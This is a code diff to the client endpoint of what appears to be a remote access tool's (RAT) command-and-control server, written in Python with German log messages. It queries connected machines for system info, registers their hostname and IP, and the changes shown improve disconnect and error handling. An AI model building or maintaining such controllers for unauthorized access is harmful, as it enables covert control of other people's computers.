@@ -231,7 +231,7 @@ async def rat_client_endpoint(websocket: WebSocket):
     client_port = websocket.client.port if websocket.client else 0
     remote_address = (client_host, client_port)
     websocket.remote_address = remote_address
-    last_ping = time.time()
+    
     try:
         await websocket.send_json({"action": "systeminfo"})
         sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=5)
@@ -249,12 +249,14 @@ async def rat_client_endpoint(websocket: WebSocket):
         hostname = f"Client {client_id}"
         os_name = ""
         ip = ""
+    
     CLIENT_INFOS[client_id] = {
         "hostname": hostname,
         "os": os_name,
         "ip": ip,
         "last_seen": time.time(),
     }
+    
     logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
     await send_to_web_ui(
         {
@@ -273,13 +275,26 @@ async def rat_client_endpoint(websocket: WebSocket):
     try:
         while True:
             try:
+                # Prüfe ob WebSocket noch aktiv ist
+                if websocket.client_state.name != "CONNECTED":
+                    logging.info(f"[Client {client_id}] WebSocket nicht mehr verbunden")
+                    break
+                    
                 data = await asyncio.wait_for(websocket.receive(), timeout=180)
             except asyncio.TimeoutError:
                 logging.warning(f"[Client {client_id}] Timeout, Verbindung wird geschlossen.")
                 break
+            except WebSocketDisconnect:
+                logging.info(f"[Client {client_id}] WebSocket disconnect empfangen")
+                break
             except Exception as e:
+                error_msg = str(e)
+                if "disconnect message has been received" in error_msg:
+                    logging.info(f"[Client {client_id}] Client bereits getrennt")
+                    break
                 logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
                 break
+                
             if data["type"] == "websocket.receive":
                 if "text" in data and data["text"]:
                     try:
@@ -291,9 +306,13 @@ async def rat_client_endpoint(websocket: WebSocket):
                         await send_to_web_ui(meta)
                     except Exception as e:
                         await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
+                        
     except WebSocketDisconnect:
-        logging.warning(f"[-] RAT-Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', client_id)}) hat die Verbindung getrennt.")
+        logging.info(f"[-] RAT-Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', client_id)}) hat die Verbindung getrennt.")
+    except Exception as e:
+        logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
     finally:
+        # Cleanup
         if client_id in RAT_CLIENTS:
             del RAT_CLIENTS[client_id]
         if client_id in CLIENT_INFOS:
